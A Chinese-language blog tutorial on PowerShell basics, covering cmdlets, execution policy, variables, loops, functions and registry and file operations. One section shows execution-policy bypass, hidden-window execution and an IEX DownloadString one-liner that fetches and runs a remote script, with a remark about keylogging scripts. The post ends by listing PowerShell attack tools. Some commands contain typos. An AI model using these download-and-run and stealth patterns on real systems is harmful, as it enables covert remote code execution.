# PowerShell基础知识


<img src="http://image.xpshuai.cn/powershell.jpg"></img>

<!-- more -->



# <center><font color=red>PowerShell技术概学</font></center>



> 本文内容较琐碎，思路较混乱，仅当入门小小小基础吧





## Powershell基础

###### 特点
- 可以面向对象
- 绑定.net
- 兼容性好
- 灵活 



###### 基本常识

- 在PowerShell下，类似 cmd命令 叫作`cmdlet`  
- 命令规范：`动词-名词`  ， 不区分大小写
- 可以直接在cmd中运行`powershell`来打开



###### 查看PowerShell版本

```
Get-Host
或者
$PSversionTable.PSVERSION
```



**ps1文件：**   一个PowerShell脚本其实就是一个简单的文本文件

**运行脚本**
1.完整路径
2.当前路径:`./test.ps1`



###### 基本命令

```powershell
Get-Command ： 得到所有PowerShell命令

Get-Process ： 获取所有进程

Get-Help  ： 显示有关 Windows PowerShell 命令和概念的信息

Get-History  ： 获取在当前会话中输入的命令的列表

Get-Job ：  获取在当前会话中运行的 Windows PowerShell 后台作业

dir –r


```



###### 执行策略

```powershell
Get-ExecutionPolicy   #查看当前策略

- Restricted        #脚本不能运行（默认）
- RemoteSigned      #本地创建的脚本可以运行，但从网上下载的脚本不能运行
- AllSigned         #仅当脚本由信任的发布者签名时才能运行
- Unrestricted      #允许所有的脚本运行
```

###### 绕过本地权限执行脚本

```powershell
powershell.exe  -ExexutionPolicy ByPass -File xxx.ps1

# -ExexutionPolicy ByPass   绕过执行安全策略
```


###### 本地隐藏绕过权限执行脚本

```powershell
powershell.exe  -ExexutionPolicy ByPass -WindowStyle Hidden -NoLogo -Nolnteractive -NoProfile -File xxx.ps1

# -WindowStyle Hidden 隐藏窗口
# -NoLogo    启动不显示版权标志的PowerShell
```

###### 用IEX下载远程PS1脚本绕过权限执行脚本

```powershell
powershell.exe  -ExexutionPolicy ByPass -WindowStyle Hidden -NoProfile -NonI IEX(New-ObjectNet.WebClient).DownloadString("xxx.ps1");[Parameters]

# -NonI   非交互模式
# -NoProfile  /     -NoP         不加载当前用户的配置文件

# Noexit    执行后不退出Shell  （这在使用键盘记录等脚本时非常重要）

```





可以直接在终端进行数字计算.....笑死



**自定义Powershell控制台**
右键自己看着自己的习惯调整吧  
编辑选项：

- 快速编辑选项（操作快且方便）
- 标准编辑选项

**Powershell快捷键**
与linux中相似
```bash
alt+F7			#清除命令的历史记录
PgUp   PgDn		#翻页的效果
Esc		#情况命令行（我还是喜欢 ^L）
Home	#移动到命令行最左端
End		#移动到命令行最右端
```

###### Powershell管道和重定向
基于对象的

管道：
```bash
#找字符串
ls | findstr "an"

# 查看name列
ls | Format-table  name
# 还可以sort等

`get-process p* | stop-process`   # 找到p...的进程，然后停止
```

重定向：
```bash
# >,  >>

#重定向到文件中
ls | Format-table  name >> test.txt

```



###### Powershell数学运算
直接在终端执行即可，无需多讲

- 进行存储单位换算：
- 运算/比较
```
#运算
1gb/1mb*18kb
# 比较
1gb -gt 1mb
```

- 进制转换，比如十六进制：`0xa`

#### Powershell执行外部命令
打开应用
```
#直接打开
notepad

#或者带双引号
&"notepad"

# 直接打开服务
services.exe

# 查看环境变量
$env:path

# 仅在当前终端设置环境变量（临时生效）
$env$path=$env$path+"路径"
```


#### Powershell命令集
>一般是`动词-名词`结构

查看所有命令：`Get-Command`
查看命令帮助: `get-help`
查看命令历史：`get-history`


###### Powershell别名
**使用**
```powershell
# 查看所有别名
get-alias

# 可以查看命令别名
get-help 命令

# 查看别名对应的真实的命令
get-alias -name ls

# 找出以remove开头的别名():
get-alias | where {$_.definition.startswitch("Remove")}

# 查询所有别名最多的，并排序
get-alias |group-object definition |sort -descending Count
```

**自定义别名**
```powershell
# 临时定义（退出终端就不生效了）
set-alias -name pad -value notepad`
# 删除别名  
del alias pad

## 永久设置别名（写入Windows PowerShell profile文件）
#1.查看此文件在计算机中的位置：
$profile
#2.一般该文件在没有创建前是不存在的，使用以下命令为当前用户创建profile命令并返回文件地址：
New-Item -Type file -Force $profile
#3.打开文件将一些内容写入文件，创建别名，比如;
Set-Alias notepad++ "C:\Development Kit\Notepad++\notepad++.exe"


# 导出别名
export-alias demp.ps1

# 导入别名
import-alias -force demo.ps1
```


#### Powershell变量
**变量基础**
```
#定义变量
$name="hhh"
#打印 直接$name


# Note: 大小写不敏感，所以特殊变量尽量用花括号
${"i am a boy"}="ggggg"

# 可以直接运算
$n=(2+8*10)/2

# 多个变量同时值
$n1=$n2=1
$m, $n=1, 2

#调换变量值
$n1, $n2=$n2, $n1

```

**变量操作**
```powershell
# 查看变量是否存在  test-path
test-path variable:$n1

# 删除变量
del variable:$n1

remove-variable


## powershell提供了五个专门管理变量的命令
Clear-Variable
Get-Variable
New-Variable
Remove-Variable
Set-Variable


### 变量写保护（只读）
#1.设置
$server = '10.10.10.10'
Set-Variable server -option Readonly
#2.新建时
New-Variable nu1 -Value 100 -Force -Option readonly
#上面的变量不能更改，但是可以通过删除变量(del Variable:num -Force)，再重新创建变量更新变量内容。

# 选项Constant，常量一旦声明，不可修改
new-variable num -Value "strong" -Option constant
```

**自动化变量**
1.用户信息：例如用户的根目录$home
2.配置信息:例如powershell控制台的大小，颜色，背景等。
3.运行时信息：例如一个函数由谁调用，一个脚本运行的目录等。

```powershell
# 比如：终端一打开就自动加载的变量

# 用户根目录
$home


# 跟linux下基本一样
$$		#包含会话所收到的最后一行中的最后一个令牌。
$^		#包含会话所收到的最后一行中的第一个令牌。
$?      #上一个命令的返回值
$_		#包含管道对象中的当前对象
$pid	#进程id
$null
$Host
$LastExitCode    #包含运行的最后一个基于 Windows 的程序的退出代码。

```
参考：[这里](https://www.pstips.net/powershell-automatic-variables.html)

**环境变量**
```powershell
#查看环境变量
ls env
ls env:name

#查看具体环境变量的值
$env:windir

# 新建用户环境变量(临时)
$env:name="xxx"
# 新建环境变量(长久)
xxx

# 在环境变量的PATH下添加一条内容
$Env:path=$Env:Path+";C:\Go\bin"  

# .net方式只对用户变量生效
[environment]::setenvironment("PATH","D:\","User")
# .net获取值
[environment]::getenvironment("PATH","User")

# 删除环境变量
del env:name
#或
remove-item env:name
```




#### 在其他脚本中使用powershell
```powershell
#比如bat
@echo off
powershell  "&'c:\Users\test\e.psl'"

```


#### Powershell条件判断
###### 条件操作符
```powershell
-eq		等于
-ne		不等与
-gt		大于
-lt		小于
-le		小于等于
-contains
#布尔
-not	取反
-ant
-or
-xor


# 比如：
80 -eq	70
1gb -gt lmb
(1,2,3) -contains 2

```

###### if语句
写脚本编辑器ISE里面了
```powershell
$num=56
if($num -gt 50 -and $num -lt 60)
{
    "大于50且小于60"
}
elseif($num -eq 50)
{
    "等于50"
}
else
{
    "小于50"
}
```

###### switch语句
```powershell
$num=45
switch($num)
{
    {($_ -lt 50) -and ($_ -gt 40)} {"小于50且大于40"}
    50 {"等于50"}
    {$_ -gt 50} {"大于50"}

}

```


#### Powershell循环结构
###### foreach语句

```powershell
$arr=1..10

foreach ($n in $arr)
{
    if($n -gt 5)
    {
        $n
    }
}

```

打印路径中大小大于多少的文件
```powershell

$pat_val=dir D:\antSword
foreach ($file in $pat_val)
{
    if($file.length -gt 1kb)
    {
        $file.name
    }
}

```


###### while语句
while
```powershell
$num=15
while($num -ge 10)
{
    $num
    $num --
}
```
do ... while(先运行一次)
```powershell
$num=15
do
{
    $num
    $num --
}while($num -ge 10)


```

###### continue与break
break
```powershell
$num=1
while($num -le 10)
{
    if($num -eq 4)
    {
        break
    }else
    {
        $num
    }
    $num++
}
```

continue
```powershell
$num=1
while($num -lt 10)
{
    if($num -eq 4)
    {
        $num++
        continue
    }else
    {
        $num
        $num++
    }
}
```


###### for语句
```powershell
$num=0
for($i=1; $i -le 100; $i++)
{
    $sum+=$i
    $sum
}
```

###### switch实现循环
```powershell
$num=1..10
switch($num)
{
    {($_ % 2) -eq 0}{"此数值是偶数：$_"}
    {($_ % 2) -ne 0}{"此数值是奇数：$_"}
    default{"num=$_"}
}
```


#### Powershell数组
###### 数组的创建
```powershell
# 1.
$arr=1,2,3,4

# 2.
$arr=1..5

# 3.可以支持不同类型的值
$arr=1,"hhh",(get-date)

# 4.空数组
$arr=@()

# 5.有个逗号就行
$arr=,1

# 6. 命令执行结果的每一行作为一个数组元素
$arr=ipconfig

#判断是否为数组
$arr -is [array]

```

###### 访问数组
```powershell
$arr[0]
$arr[-1]

$arr[0..2]  # 取出0,1,2

$arr.Count  # 元素个数

$arr[($arr.Count)..0]  # 倒序

$arr+="haha" # 增加元素

```

#### Powershell函数
###### 自定义函数及调用
```powershell
function test
{
    ping www.xpshuai.cn.
}

test  # 调用
```
传参
```powershell
function test($site)
{
    ping $site
}

test www.xpshuai.cn # 调用

# 多个参数
test p1 p2

```



###### 函数返回值
```powershell
function add($n1, $n2)
{
    $c=$n1,$n2
    $sum=$n1+$n2;
    $sum.gettype().fullname   # 数据类型
    if($sum.gettype().fullname -eq "System.Double")
    {
        "c为数组，索引取值: $c[0]"
        return $n1,$n2,$sum,"double浮点数"
    }
    return $n1,$n2,$sum
}

add 1 2.5 # 调用
```

#### Powershell定义文本
powershell中转义符是反引号
```powershell
"hello先执行命令: $(Get-Date)"

"hello表达式: $(5*6)"

"单双引号hello, my name is '哈哈'"

"都用双引号，用反引号转义：hello, my name is `"哈哈`""


# 换行符:`n     回车: `r
"你好啊 `n 朋友 `n 我换行啦"
```


#### Powershell实现用户交互
read-host
```powershell

$input=read-host "请输入用户名"
"您好，你输入从用户名为: $input"
```

#### Powershell格式化字符串
```powershell
# 格式化之前
$name="lili"
$age=20
$gender="girl"
"My name is $name, i am $age years old, and i am a $gender"


# 格式化          -f
$name="lili"
$age=20
$gender="girl"
"My name is {0}, i am {1} years old, and i am a {2}, {3}." -f $name,$age,$gender,$(3*6)
#运算的话，尽量用小括号括起来

```


#### String对象方法
对字符串的操作
```powershell
$str="D:\Desktop\Cobalt strike4\test\a.txt"

$str.Split(".")[-1]  # 以.点分割，然后取最后一位
$str.endswith("ll")   # 是否以ll结尾
$str.Contains("txt")  # 是否包含某个字符串
$str.CompareTo("D:\Desktop\Cobalt strike4\test\a.txt")  # 判断两个字符串是否相等
$str.IndexOf("w")  # 找出w的索引位置
$str.Insert(3,"hhh") # 在索引3地方插入hhh
$str.Replace("c","C")  # 替换
$str.Remove(0)   # 删除

```


#### Powershell操作注册表
```powershell
#切换到根键
cd hkcu:
cd ..
exit
# 切换到别的根键
cd HKLM:

# 获取
get-ItemProperty
# 设置
set-ItemProperty

# 移除
remove-ItemProperty

# 等等其他

命令							描述
Dir, Get-ChildItem			列出键的内容
Cd, Set-Location			更改当前（键）目录
HKCU:, HKLM:				预定义的两个重要注册表根目录虚拟驱动器
Get-ItemProperty			读取键的值
Set-ItemProperty			设置键的值
New-ItemProperty			给键创建一个新值
Clear-ItemProperty			删除键的值内容
Remove-ItemProperty			删除键的值
New-Item, md				创建一个新键
Remove-Item, Del			删除一个键
Test-Path					验证键是否存在
```



#### Powershell文件操作

```powershell
# 新建目录
 New-Item xxxx -type directory      # 或者 md test
# 新建文件
 New-Item xxxx.txt -type File
# 删除目录
Remove-Item test
# 显示文本内容
Get-Content test.txt
# 设置文本内容
 Set-Content .\test.txt -Value "哈哈哈哈哈哈哈"
# 追加内容
Add-Content .\test.txt -Value "嘻嘻嘻嘻嘻嘻嘻嘻"
# 清除内容
 Clear-Content .\test.txt

```





## 常用的PowerShell攻击工具：

- PowerSploit
- NiShang         
- Empire            (基于PowerShell的远控木马)
- PowerCat        (PowerShell版的NetCat)



## 其他技巧
... ...  

---

> 作者: [剑胆琴心](http://geoer.cn)  
> URL: https://shuai06.github.io/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/  

